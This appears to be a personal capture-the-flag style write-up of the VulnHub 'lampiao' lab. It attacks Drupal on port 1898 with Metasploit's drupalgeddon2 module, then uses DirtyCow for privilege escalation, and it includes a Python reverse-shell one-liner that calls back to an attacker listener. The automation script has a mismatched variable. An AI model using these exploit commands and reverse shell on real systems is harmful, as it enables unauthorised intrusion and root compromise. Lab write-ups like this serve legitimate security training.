#Reconnaissance 
Nmap scan. 
Found port 1898 open, which was found to be running drupal
Looked for Drupal enumeration apps and was able to find "Drupwn" on github. Installed and executed, discovering the running version was likely to be 8.x


#InitialAccess
Searchsploit contained several entries for "DrupalGeddon". One of them had a .rb extension, implying it was a msf module, so I executed ``` msfconsole ``` followed by ```search drupal```, which confirmed a module did exist.

Low priv shell can be automated as follows in (Kali with metasploit framework)
```
#lampiao_low_priv.sh
#/bin/bash
rhost=${1}
msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;\
	set payload php/meterpreter/bind_tcp;\
	set rport 1898;\
	set rhost $tgt;\
	exploit;\
	cd ~/toolz;\
	# upload ~/toolz/les.sh /tmp/" # enumeration script 
```
 
 #Discovery 
After  executing a large number of manual enumeration steps, checked other guides. The majority of users achieved root by using the Linux Exploit Suggester script (les.sh), which feels sort of cheap compared to the typically OffSec box (granted, this is vanilla vuln-hub).

uname -a output
```
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
```
searchsploit 4.4.0 nets the following
![[Pasted image 20220609223956.png]]

- Several of the Ubuntu related exploits are inapplicable as they apply to version 16.04
- Chocoboroot fails due to the arch not being applicable (i686)


#PrivilegeEscalation
From attacker computer, set up listener for stable reverse shell (php shell seems to die after executing dirty cow)

```
nc -lvp 7777
export tgt={target ip address}
```

This will spawn a meterpreter shell on the victim. Once it's opened, execute the following
```
# meterpreter cmds
upload DirtyCow.c /tmp/dcow.c
shell
```

Once dropped into the shell, execute the following
```
# on lampiao
cd /tmp
gcc dcow.c -o dc -pthread
chmod +x dc
./dc 

# executing binary interrupts flow here. Have to manually copy and paste 
# these commands, unless there's a way to modify the payload to execute 
# them automatically. (likely)

echo 0 > /proc/sys/vm/dirty_writeback_centisecs
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.49.75',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
whoami
```